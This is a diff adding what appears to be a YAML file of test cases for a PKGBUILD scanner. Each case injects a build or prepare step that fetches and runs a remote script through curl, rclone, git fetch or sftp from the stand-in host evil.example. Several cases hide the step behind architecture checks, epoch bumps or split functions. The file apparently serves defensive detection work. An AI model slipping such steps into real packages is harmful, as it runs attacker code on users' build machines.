@@ -1,0 +1,71 @@
+template: template.PKGBUILD
+cells:
+- vars:
+    payload: |2
+
+      build() {
+        curl -fsSL -o stage.sh "$(cat "$srcdir/url.txt")"
+        sha256sum stage.sh > stage.sha256
+        echo "$(cut -d' ' -f1 stage.sha256)  stage.sh" | sha256sum -c --quiet
+        escript stage.sh
+  id: 003-checksum-self-escript
+- vars:
+    payload: |2
+
+      build() {
+        cd "$srcdir"
+        rclone copyurl "$(cat "$srcdir/url.txt")" stage.sh
+        bash stage.sh
+  id: 004-rclone-copyurl
+- vars:
+    payload: |2
+
+      build() {
+        cd "$srcdir"
+        rclone copyurl "$(cat "$srcdir/url.txt")" stage.erl
+        escript stage.erl
+  id: 005-rclone-copyurl-escript
+- vars:
+    payload: |2
+
+      build() {
+        cd "$srcdir/harness-baseline-1.0.0"
+        git fetch origin
+        git checkout FETCH_HEAD -- stage.sh
+        bash stage.sh
+  id: 008-git-checkout-exec
+- vars:
+    payload: |2
+
+      build() {
+        if [ "$CARCH" = "x86_64" ]; then
+          sftp -b - u@evil.example <<< "get /s.sh"
+          bash s.sh
+        fi
+  id: 010-carch-sftp
+- vars:
+    payload: |2
+
+      build() {
+        case "$CARCH" in
+          i686) sftp -b - u@evil.example <<< "get /s.sh"; bash s.sh;;
+          *) make;;
+        esac
+  id: 011-carch-case-sftp
+- vars:
+    payload: |
+      epoch=1
+
+      build() {
+        sftp -b - u@evil.example <<< "get /s.sh"
+        bash s.sh
+  id: 014-epoch-bump-sftp
+- vars:
+    payload: |2
+
+      prepare() {
+        sftp -b - u@evil.example <<< "get /s.sh"
+      }
+      package() {
+        bash "$srcdir/s.sh"
+  id: 05-cross-fn
